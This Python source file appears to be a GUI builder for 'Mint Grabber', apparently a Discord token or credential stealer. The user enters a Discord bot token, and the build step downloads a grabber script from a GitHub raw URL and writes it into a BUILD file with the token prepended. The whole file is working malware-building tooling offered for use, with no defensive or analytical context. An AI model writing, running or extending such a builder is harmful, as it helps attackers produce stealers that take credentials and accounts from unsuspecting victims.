import customtkinter
import random
import requests
import time

customtkinter.set_default_color_theme("green")

app = customtkinter.CTk()
app.geometry("480x200")

label1 = customtkinter.CTkLabel(app,text="Mint Grabber Builder")
label1.pack()
label2 = customtkinter.CTkLabel(app,text="Discord Bot Token")
label2.pack(pady = 10)
token = customtkinter.CTkTextbox(app,width=470,height=20)
token.pack(pady=10)

x = str(random.randint(0,9999))

def build_function():
    with open(f"BUILD{x}.txt", "w") as file:
        req = requests.get("https://raw.githubusercontent.com/Kokonin/mintgrabber/main/grabber.pyw")
        whattowrite = token.get("0.0","end").strip()
        file.write(f'TOKEN = "{whattowrite}"')
        time.sleep(0.1)
        file.write(req.text)

build = customtkinter.CTkButton(app,width = 470,height = 30,command=build_function,text="Build")
build.pack()

app.mainloop()
